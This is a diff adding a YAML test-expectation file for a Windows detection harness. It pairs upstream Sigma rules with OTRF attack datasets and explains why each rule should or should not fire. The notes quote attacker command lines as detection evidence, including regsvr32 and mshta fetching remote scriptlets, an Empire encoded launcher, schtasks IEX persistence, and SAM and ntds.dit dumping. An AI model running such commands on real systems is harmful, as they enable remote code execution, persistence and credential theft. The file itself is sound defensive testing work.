@@ -1,0 +1,330 @@
+# Contract between Sigma rules and OTRF datasets for the Windows e2e harness.
+#
+# Each entry says: when this Sigma rule is converted by
+# victorialogs_windows_eventlog() and queried against this dataset (after
+# Vector ingest into VictoriaLogs), we expect at least `min_hits` hits for
+# kind=positive, or exactly 0 hits for kind=negative.
+#
+# Schema (all fields required unless noted):
+#
+#   - id:           stable test identifier (used in pytest test IDs and CI logs)
+#     rule_path:    path under SIGMA_CORPUS_PATH (defaults to /tmp/sigma-rules)
+#                   to the upstream Sigma rule. We test the exact rule a real
+#                   user would run, not a hand-written test rule.
+#     dataset_path: path under e2e/datasets/ to the JSON dump produced by
+#                   `make e2e-fetch` from the manifest in e2e/datasets.yml.
+#     kind:         "positive" or "negative".
+#     min_hits:     integer ≥ 1 — required for positive, ignored for negative.
+#     notes:        free-form rationale; explain why this pair was chosen,
+#                   how confident we are, and what would invalidate it.
+#
+# Failure semantics:
+#   - positive with hits < min_hits  -> hard fail (regression in pipeline,
+#                                      remap, or rule mapping)
+#   - negative with hits > 0         -> hard fail (false positive surface)
+#   - schema or path resolution error -> hard fail before any query runs
+
+version: 1
+
+expectations:
+  - id: empire_launch_in_psremoting_stager
+    rule_path: rules/windows/process_creation/proc_creation_win_hktl_empire_powershell_launch.yml
+    dataset_path: otrf/empire_psremoting_stager.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      Empire's PSRemoting stager launches `powershell.exe -noP -sta -w 1 -enc <b64>`
+      via Sysmon EID 1 (process_creation). The Sigma rule selector matches this
+      command-line literally — strongest-confidence positive in the seed.
+
+  - id: sharpview_in_sharpview_dataset
+    rule_path: rules/windows/process_creation/proc_creation_win_hktl_sharpview.yml
+    dataset_path: otrf/cmd_sharpview_pcre_net.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      The dataset contains Sysmon EID 1 events with Image=...\SharpView.exe,
+      OriginalFileName=SharpView.exe, and CommandLines containing rule keywords
+      (Get-ObjectAcl, etc.). All three rule selectors match.
+
+  - id: powershell_as_service_in_fax_modification
+    rule_path: rules/windows/registry/registry_set/registry_set_powershell_as_service.yml
+    dataset_path: otrf/cmd_service_mod_fax.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      Privesc dataset modifies HKLM\System\CurrentControlSet\Services\Fax\ImagePath
+      to a powershell.exe payload. Captured as Sysmon EID 13 (registry_set).
+      Rule selector (TargetObject contains \Services\, endswith \ImagePath,
+      Details contains 'powershell') matches verbatim.
+
+  - id: empire_powershell_module_logging_in_mimikatz
+    rule_path: rules/windows/powershell/powershell_module/posh_pm_alternate_powershell_hosts.yml
+    dataset_path: otrf/empire_mimikatz_logonpasswords.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      Empire's mimikatz module triggers Microsoft-Windows-PowerShell/Operational
+      EID 4103 (1695 events in this dataset). Empire's launcher path uses
+      lowercase 'C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      while the rule's filter_powershell selectors match the canonical
+      'C:\Windows\System32\...' casing — every Empire 4103 event slips past
+      the filter and trips the alternate-host selector, exercising the
+      ps_module logsource path through the pipeline.
+
+      Originally pointed at posh_pm_susp_invocation_specific.yml, but Empire's
+      "-noP -sta -w 1 -enc <b64>" launcher does not match any of that rule's
+      hard-coded sub-strings (no 'hidden', no '-ep bypass', no '-noni'), so
+      the rule produced 0 hits on this dataset.
+
+  - id: lsass_memdump_in_mimikatz
+    rule_path: rules-threat-hunting/windows/process_access/proc_access_win_lsass_uncommon_access_flag.yml
+    dataset_path: otrf/empire_mimikatz_logonpasswords.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      Empire's in-memory mimikatz path opens LSASS with GrantedAccess=0x1010
+      from powershell.exe via an ntdll.dll-rooted CallTrace ending in
+      |UNKNOWN(...) — the dataset has exactly one such EID 10 event.
+
+      The original proc_access_win_lsass_memdump.yml requires the strict
+      0x1038/0x1438/0x143a/0x1fffff flags (and dbgcore/dbghelp on the
+      CallTrace), neither of which Empire trips. The threat-hunting rule
+      proc_access_win_lsass_uncommon_access_flag.yml matches GrantedAccess
+      ending in '10' against any non-allowlisted SourceImage; powershell.exe
+      is not on the allowlist, so it fires.
+
+      The originally-suggested swap (proc_access_win_susp_dbgcore_dbghelp_load
+      .yml) does not work either because Empire's CallTrace contains neither
+      dbgcore.dll nor dbghelp.dll — it goes through ntdll.dll into UNKNOWN()
+      reflective frames.
+
+  - id: sharpview_negative_against_powershell_dataset
+    rule_path: rules/windows/process_creation/proc_creation_win_hktl_sharpview.yml
+    dataset_path: otrf/psh_powershell_httplistener.json
+    kind: negative
+    notes: |
+      Cross-check: the SharpView rule must NOT fire on a dataset that does not
+      contain SharpView. Verified: 0 SharpView mentions in this dataset.
+
+  # --------------------------------------------------------------------------
+  # OTRF breadth expansion. 12 positives + 3 negatives
+  # picked to cover MITRE techniques the seed entries above did not reach:
+  # defense_evasion, persistence, discovery, plus additional
+  # credential_access and lateral_movement variants. For every pair the
+  # rule's selectors were verified against the dataset's actual events
+  # (Sysmon EID 1 process_creation lines, EID 13 registry_set Details,
+  # EID 19/20/21 wmi_event records, System EID 7045 ImagePath) before
+  # being committed; see notes per entry for the exact discriminating
+  # field/value.
+  # --------------------------------------------------------------------------
+
+  - id: bitsadmin_download_in_bitsadmin_dataset
+    rule_path: rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml
+    dataset_path: otrf/cmd_bitsadmin_download_psh_script.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      Sysmon EID 1: Image=C:\Windows\System32\bitsadmin.exe with CommandLine
+      "bitsadmin.exe  /transfer /Download /priority Foreground https://… …".
+      Both selection_img (Image|endswith \bitsadmin.exe) and selection_cmd
+      (CommandLine contains ' /transfer ') match.
+
+  - id: mshta_javascript_in_mshta_sct_dataset
+    rule_path: rules/windows/process_creation/proc_creation_win_mshta_javascript.yml
+    dataset_path: otrf/cmd_mshta_javascript_getobject_sct.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      Sysmon EID 1: Image=…\mshta.exe with CommandLine
+      "mshta.exe  javascript:a=(GetObject('script:https://…sct')).Exec();close();".
+      selection_img + selection_cli (CommandLine contains 'javascript') both
+      match — strongest-confidence positive in the breadth slate.
+
+  - id: netsh_fw_add_rule_in_netsh_dataset
+    rule_path: rules/windows/process_creation/proc_creation_win_netsh_fw_add_rule.yml
+    dataset_path: otrf/cmd_netsh_fw_mod_open_ports.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      Sysmon EID 1: Image=…\netsh.exe with CommandLine
+      "netsh  advfirewall firewall add rule name=\"atomic testing\" action=allow
+      dir=in protocol=TCP localport=450". CommandLine contains both
+      ' firewall ' and ' add '; the Dropbox false-positive filter does not
+      match this rule name.
+
+  - id: regsvr32_squiblydoo_in_empire_sct_dataset
+    rule_path: rules/windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml
+    dataset_path: otrf/empire_launcher_sct_regsvr32.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      Sysmon EID 1: Image=…\regsvr32.exe with CommandLine
+      "\"C:\windows\system32\regsvr32.exe\" /s /n /u /i:http://10.10.10.5:8444
+      /launcher.sct scrobj.dll" — selection_flag (' /i') and selection_protocol
+      ('http') both match. Distinct from the existing Empire-launcher
+      expectation (which targets the powershell child via the HKTL rule);
+      this exercises the regsvr32-LOLBAS branch instead.
+
+  - id: cmstp_uac_bypass_in_cmstp_dataset
+    rule_path: rules/windows/process_creation/proc_creation_win_uac_bypass_cmstp.yml
+    dataset_path: otrf/psh_cmstp_execution_bypassuac.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      Sysmon EID 1: Image=…\cmstp.exe with CommandLine
+      "\"C:\windows\system32\cmstp.exe\" /s C:\ProgramData\T1218.003_uacbypass.inf /au"
+      — selection_img + selection_cli match on both '/s' and '/au'.
+
+  - id: userinit_logon_script_persistence_in_userinit_dataset
+    rule_path: rules/windows/registry/registry_set/registry_set_persistence_logon_scripts_userinitmprlogonscript.yml
+    dataset_path: otrf/cmd_userinitmprlogonscript_batch.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      Sysmon EID 13 (registry_set):
+      TargetObject=HKU\<sid>\Environment\UserInitMprLogonScript with
+      Details=C:\Users\wardog\AppData\Local\Temp\art.bat. The Sigma rule
+      has a single selector — TargetObject|contains 'UserInitMprLogonScript'
+      — a unique-per-technique token whose case in the data exactly
+      matches the rule, so the case-sensitive VictoriaLogs phrase filter
+      hits cleanly.
+
+      Initially targeted the Run-key persistence dataset
+      (empire_persistence_registry_modification_run_keys_elevated_user)
+      with proc_creation_win_hktl_powersploit_empire_default_schtasks /
+      registry_set_powershell_in_run_keys.yml, but every Run-key SigmaHQ
+      rule encodes the path as '\Software\…\Run' (mixed case) while the
+      OTRF capture writes the OS-canonical 'HKLM\SOFTWARE\…\Run' (caps
+      SOFTWARE). LogsQL phrase filters are case-sensitive, so the
+      mixed-case selector does not match the uppercase data and the
+      rules return 0 hits. Switched to the UserInitMprLogonScript
+      atomic, which is single-token-discriminating and not subject to
+      that mismatch.
+
+  - id: schtasks_susp_pattern_in_empire_schtasks_dataset
+    rule_path: rules/windows/process_creation/proc_creation_win_schtasks_susp_pattern.yml
+    dataset_path: otrf/empire_schtasks_creation_execution_elevated_user.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      Sysmon EID 1: Image=…\schtasks.exe, CommandLine
+      "\"C:\windows\system32\schtasks.exe\" /Create /F /RU system /SC ONLOGON
+      /TN MordorElevated /TR \"…powershell.exe -NonI -W hidden -c \"IEX (
+      [Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String(…)))\"\"".
+      selection_schtasks (Image+'/Create ') matches; selection_uncommon
+      branch fires via 'FromBase64String' substring (the all-pattern and
+      all-anomaly branches do NOT fire — the canonical Empire schtasks
+      template uses '/RU system' and '/SC ONLOGON' but neither cmd /c
+      nor cscript|curl|wscript, so 'FromBase64String' is the discriminator).
+
+  - id: wmi_event_subscription_in_empire_wmi_dataset
+    rule_path: rules/windows/wmi_event/sysmon_wmi_event_subscription.yml
+    dataset_path: otrf/empire_wmi_local_event_subscriptions_elevated_user.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      Sysmon WMI events under Microsoft-Windows-Sysmon/Operational:
+      EID 19 (WmiEventFilter, Operation=Created, Name=\"Updater\"),
+      EID 20 (WmiEventConsumer, Type=\"Command Line\"), and EID 21
+      (WmiEventConsumerToFilter). The Sigma rule's logsource is
+      `category: wmi_event`, which the generic Windows pipeline does NOT
+      remap to a winlog.channel selector — the converted query is just
+      `winlog.event_id:in(19, 20, 21)`. That intentionally matches Sysmon-
+      sourced WMI subscription events, which is the only place these EIDs
+      appear in the dataset.
+
+  - id: seatbelt_in_seatbelt_dataset
+    rule_path: rules/windows/process_creation/proc_creation_win_pua_seatbelt.yml
+    dataset_path: otrf/cmd_seatbelt_group_user.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      Sysmon EID 1: Image=C:\Users\wardog\Desktop\Seatbelt.exe with
+      CommandLine "Seatbelt.exe  -group=user". selection_img branch fires
+      via Image|endswith '\Seatbelt.exe' — the rule's
+      `selection_img OR (selection_group_list AND selection_group_output)`
+      condition is satisfied without the `-outputfile=` group-mode AND
+      requirement.
+
+  - id: esentutl_sensitive_file_copy_in_sam_copy_dataset
+    rule_path: rules/windows/process_creation/proc_creation_win_esentutl_sensitive_file_copy.yml
+    dataset_path: otrf/cmd_sam_copy_esentutl.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      Sysmon EID 1: Image=C:\Windows\System32\esentutl.exe with
+      CommandLine "esentutl.exe  /y /vss C:\windows/system32/config/SAM
+      /d C:\ProgramData\SAM". selection_esent_img matches
+      Image|endswith \esentutl.exe; selection_esent_cli matches via the
+      windash-expanded ' /y ' / 'vss' substrings, so
+      `all of selection_esent_*` fires. (selection_susp_paths does NOT
+      match — Empire's atomic uses a forward-slash mid-path
+      'system32/config/SAM' while the rule selector is back-slash
+      '\config\sam'; the all-img-cli branch of the OR carries the
+      detection.)
+
+      Replaces an earlier net-localgroup-recon expectation
+      (proc_creation_win_net_groups_and_accounts_recon.yml against
+      empire_shell_net_localgroup_administrators) which gated on lowercase
+      ' administrator' substrings and so could not match the dataset's
+      capital "Administrators" under VictoriaLogs's case-sensitive phrase
+      filter. esentutl SAM-copy preserves the credential-access breadth
+      and adds a distinct sub-technique (T1003.002) alongside the
+      existing ntdsutil T1003.003 entry.
+
+  - id: ntdsutil_usage_in_ntdsutil_dataset
+    rule_path: rules/windows/process_creation/proc_creation_win_ntdsutil_usage.yml
+    dataset_path: otrf/cmd_dumping_ntds_dit_file_ntdsutil.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      Sysmon EID 1: Image=C:\Windows\System32\ntdsutil.exe with CommandLine
+      "ntdsutil  \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntds_T1003\" q q"
+      — the rule has a single Image|endswith selector so any ntdsutil
+      invocation in the dataset qualifies.
+
+  - id: powershell_as_service_in_empire_psexec_dataset
+    rule_path: rules/windows/builtin/system/service_control_manager/win_system_powershell_script_installed_as_service.yml
+    dataset_path: otrf/empire_psexec_dcerpc_tcp_svcctl.json
+    kind: positive
+    min_hits: 1
+    notes: |
+      System EID 7045 (Service Control Manager) with ServiceName="Updater"
+      and ImagePath="%COMSPEC% /C start /b C:\Windows\System32\WindowsPowershell
+      \v1.0\powershell -noP -sta -w 1 -enc <b64>". Pipeline maps `service: system`
+      to winlog.channel="System"; Provider_Name="Service Control Manager",
+      EID=7045, ImagePath contains 'powershell' — full selector match.
+      Distinct from the existing PSRemoting Empire entry, which exercises
+      the powershell-launch HKTL rule rather than the service-install path.
+
+  - id: ntdsutil_negative_against_bitsadmin_dataset
+    rule_path: rules/windows/process_creation/proc_creation_win_ntdsutil_usage.yml
+    dataset_path: otrf/cmd_bitsadmin_download_psh_script.json
+    kind: negative
+    notes: |
+      Cross-check: the ntdsutil rule must NOT fire on a defense-evasion
+      bitsadmin dataset. Verified: 0 \ntdsutil.exe Images in this JSON.
+
+  - id: seatbelt_negative_against_mshta_dataset
+    rule_path: rules/windows/process_creation/proc_creation_win_pua_seatbelt.yml
+    dataset_path: otrf/cmd_mshta_javascript_getobject_sct.json
+    kind: negative
+    notes: |
+      Cross-check: the PUA-Seatbelt rule must NOT fire on the mshta
+      javascript dataset. Verified: 0 occurrences of \Seatbelt.exe,
+      OriginalFileName=Seatbelt.exe, Description=Seatbelt, or any of the
+      Seatbelt CommandLine flag substrings (DpapiMasterKeys,
+      InterestingProcesses, …, ProcessCreationEvents) in this dataset.
+
+  - id: wmi_event_subscription_negative_against_userinit_dataset
+    rule_path: rules/windows/wmi_event/sysmon_wmi_event_subscription.yml
+    dataset_path: otrf/cmd_userinitmprlogonscript_batch.json
+    kind: negative
+    notes: |
+      Cross-check: the WMI-event-subscription rule (winlog.event_id:in(19,
+      20, 21)) must NOT fire on a dataset that uses logon-script
+      persistence (UserInitMprLogonScript registry value) instead of WMI
+      subscriptions. Verified: 0 events with EID 19/20/21 in this JSON.
+      Discriminates the wmi_event persistence path from the registry_set
+      persistence path.
